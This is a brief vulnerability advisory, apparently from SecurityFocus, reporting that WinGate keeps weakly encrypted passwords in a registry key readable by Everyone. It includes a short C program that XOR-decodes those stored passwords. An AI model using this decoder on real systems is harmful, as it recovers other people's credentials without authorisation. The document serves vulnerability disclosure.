source: http://www.securityfocus.com/bid/511/info

WinGate stores encrypted passwords in the registry, in a subkey where Everyone has Read access by default. The encryption scheme is weak, and therefore anyone can get and decrypt them.

#include "stdafx.h"
#include <stdio.h>
#include <string.h>

main(int argc, char *argv[]) {
char i;

for(i = 0; i < strlen(argv[1]); i++)
putchar(argv[1][i]^(char)((i + 1) << 1));
return 0;

}